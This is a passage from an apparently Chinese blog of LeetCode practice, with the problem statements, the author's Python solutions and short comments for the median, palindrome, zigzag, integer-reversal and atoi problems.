float:</span></span><br><span class="line">new_list = nums1 + nums2</span><br><span class="line">new_list.sort()</span><br><span class="line">length = <span class="built_in">len</span>(new_list)</span><br><span class="line"><span class="keyword">if</span> length % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">mid_num = new_list[(length - <span class="number">1</span>)//<span class="number">2</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mid_num = (new_list[(length)//<span class="number">2</span> - <span class="number">1</span>] + new_list[(length)//<span class="number">2</span>]) / <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span>(mid_num)</span><br></pre></td></tr></table></figure><p>list().sort() yyds</p><hr /><h1 id="最长回文子串"><a class="markdownIt-Anchor" href="#最长回文子串"></a> <a href="https://leetcode-cn.com/problems/longest-palindromic-substring">最长回文子串</a></h1><p>给你一个字符串<code>s</code>，找到<code>s</code>中最长的回文子串。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;babad&quot;</span><br><span class="line">输出：&quot;bab&quot;</span><br><span class="line">解释：&quot;aba&quot; 同样是符合题意的答案。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;cbbd&quot;</span><br><span class="line">输出：&quot;bb&quot;</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;a&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ac&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring">https://leetcode-cn.com/problems/longest-palindromic-substring</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; str:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(s)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sub_str = <span class="string">&quot;&quot;</span></span><br><span class="line">sub_len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>, index1-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> s[index2] == s[index1] <span class="keyword">and</span> s[index1:index2+<span class="number">1</span>] == s[index1:index2+<span class="number">1</span>][::-<span class="number">1</span>]:</span><br><span class="line">temp_len = index2 + <span class="number">1</span> - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line">sub_str = s[index1:index2+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span>(sub_str)</span><br></pre></td></tr></table></figure><p>看到&quot;ccc&quot;这个测试数据人都傻了<br />换个角度思考，逆向搜寻字符串就好解决这事了</p><hr /><h1 id="z-字形变换"><a class="markdownIt-Anchor" href="#z-字形变换"></a> <a href="https://leetcode-cn.com/problems/zigzag-conversion">Z 字形变换</a></h1><p>将一个给定字符串s根据给定的行数<code>numRows</code>，以从上往下、从左到右进行<code>Z</code>字形排列。</p><p>比如输入字符串为<code>&quot;PAYPALISHIRING&quot;</code>行数为3时，排列如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure><p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;PAHNAPLSIIGYIR&quot;</code>。</p><p>请你实现这个将字符串进行指定行数变换的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string convert(string s, int numRows);</span><br></pre></td></tr></table></figure><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 3</span><br><span class="line">输出：&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 4</span><br><span class="line">输出：&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">解释：</span><br><span class="line">P IN</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P I</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;A&quot;, numRows &#x3D; 1</span><br><span class="line">输出：&quot;A&quot;</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/zigzag-conversion">https://leetcode-cn.com/problems/zigzag-conversion</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">self, s: <span class="built_in">str</span>, numRows: <span class="built_in">int</span></span>) -&gt; str:</span></span><br><span class="line"><span class="keyword">if</span> numRows == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(s)</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">forward = <span class="literal">True</span></span><br><span class="line">y = -<span class="number">1</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(numRows):</span><br><span class="line">lst.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line"><span class="keyword">if</span> forward == <span class="literal">True</span>:</span><br><span class="line">y += <span class="number">1</span></span><br><span class="line">lst[y] += s[index]</span><br><span class="line"><span class="keyword">if</span> y == numRows-<span class="number">1</span>:</span><br><span class="line">forward = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">y -= <span class="number">1</span></span><br><span class="line">lst[y] += s[index]</span><br><span class="line"><span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">forward = <span class="literal">True</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> lst:</span><br><span class="line">result += _</span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>一开始各种算形状的周期、余数、重复次数<br />然后拿这些玩意算矩阵宽度<br />再造一个二维列表当矩阵<br />看到用时超过11%，内存超过7%就知道自己在犯病了</p><p>直接把这个题想象成一维的来回扫描模型就好多了</p><hr /><h1 id="整数反转"><a class="markdownIt-Anchor" href="#整数反转"></a> <a href="https://leetcode-cn.com/problems/reverse-integer">整数反转</a></h1><p>给你一个<code>32</code>位的有符号整数<code>x</code>，返回将<code>x</code>中的数字部分反转后的结果。</p><p>如果反转后整数超过<code>32</code>位的有符号整数的范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，就返回<code>0</code>。</p><p>假设环境不允许存储64位整数（有符号或无符号）。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 0</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/reverse-integer">https://leetcode-cn.com/problems/reverse-integer</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; int:</span></span><br><span class="line">temp = []</span><br><span class="line">negative = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">negative = <span class="literal">True</span></span><br><span class="line">x = - x</span><br><span class="line"><span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">temp.append(x % <span class="number">10</span>)</span><br><span class="line">x //= <span class="number">10</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>, -<span class="built_in">len</span>(temp)-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">num += temp[_] * <span class="built_in">pow</span>(<span class="number">10</span>, cnt)</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> negative == <span class="literal">True</span> <span class="keyword">and</span> num &lt;= <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">num = -num</span><br><span class="line"><span class="keyword">return</span>(num)</span><br><span class="line"><span class="keyword">elif</span> negative == <span class="literal">False</span> <span class="keyword">and</span> num &lt;= <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>) - <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(num)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>挨个模10取余数丢列表<br />然后反向读列表就行<br />速度不错，但是内存太高了</p><hr /><h1 id="字符串转换整数-atoi"><a class="markdownIt-Anchor" href="#字符串转换整数-atoi"></a> <a href="https://leetcode-cn.com/problems/string-to-integer-atoi">字符串转换整数 (atoi)</a></h1><p>请你来实现一个<code>myAtoi(string s)</code>函数，使其能将字符串转换成一个 32 位有符号整数（类似 C/C++ 中的<code>atoi</code>函数）。</p><p>函数<code>myAtoi(string s)</code>的算法如下：</p><ul><li>读入字符串并丢弃无用的前导空格</li><li>检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 如果两者都不存在，则假定结果为正。</li><li>读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。</li><li>将前面步骤读入的这些数字转换为整数（即，“123” -&gt; 123， “0032” -&gt; 32）。如果没有读入数字，则整数为 0 。必要时更改符号（从步骤 2 开始）。</li><li>如果整数数超过32位有符号整数范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，需要截断这个整数，使其保持在这个范围内。具体来说，小于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>的整数应该被固定为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，大于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的整数应该被固定为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</li><li>返回整数作为最终结果。</li></ul><p>注意：<br />本题中的空白字符只包括空格字符’ '。<br />除前导空格或数字后的其余字符串外，请勿忽略任何其他字符。</p><p>示例1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;42&quot;</span><br><span class="line">输出：42</span><br><span class="line">解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。</span><br><span class="line">第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;42&quot;（读入 &quot;42&quot;）</span><br><span class="line">   ^</span><br><span class="line">解析得到整数 42 。</span><br></pre></td></tr></table></figure><p>由于 “42” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 42 。</p><p>示例2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;   -42&quot;</span><br><span class="line">输出：-42</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;   -42&quot;（读入前导空格，但忽视掉）</span><br><span class="line">^</span><br><span class="line">第 2 步：&quot;   -42&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;   -42&quot;（读入 &quot;42&quot;）</span><br><span class="line">   ^</span><br><span class="line">解析得到整数 -42 。</span><br></pre></td></tr></table></figure><p>由于 “-42” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 -42 。</p><p>示例3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;4193 with words&quot;</span><br><span class="line">输出：4193</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;4193 with words&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;4193 with words&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;4193 with words&quot;（读入 &quot;4193&quot;；由于下一个字符不是一个数字，所以读入停止）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 4193 。</span><br></pre></td></tr></table></figure><p>由于 “4193” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 4193 。</p><p>示例4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;words and 987&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;words and 987&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;words and 987&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;words and 987&quot;（由于当前字符 &#39;w&#39; 不是一个数字，所以读入停止）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 0 ，因为没有读入任何数字。</span><br></pre></td></tr></table></figure><p>由于 0 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 